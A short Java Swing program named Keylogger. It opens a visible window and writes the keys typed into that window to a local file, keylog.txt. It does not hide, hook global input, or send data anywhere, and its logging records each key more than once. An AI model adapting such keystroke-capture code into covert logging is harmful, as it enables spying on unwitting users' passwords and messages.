import java.awt.event.KeyEvent;
import java.awt.event.KeyListener;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import javax.swing.JFrame;

public class Keylogger extends JFrame implements KeyListener {
    
    private static final long serialVersionUID = 1L;
    private BufferedWriter writer;

    public Keylogger() {
        try {
            writer = new BufferedWriter(new FileWriter("keylog.txt", true));
        } catch (IOException e) {
            e.printStackTrace();
        }
        this.addKeyListener(this);
        this.setTitle("Keylogger");
        this.setSize(400, 200);
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setVisible(true);
    }

    @Override
    public void keyTyped(KeyEvent e) {
        logKey(e);
    }

    @Override
    public void keyPressed(KeyEvent e) {
        logKey(e);
    }

    @Override
    public void keyReleased(KeyEvent e) {
        logKey(e);
    }

    private void logKey(KeyEvent e) {
        try {
            writer.write(e.getKeyChar());
            writer.flush();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    public static void main(String[] args) {
        new Keylogger();
    }
}
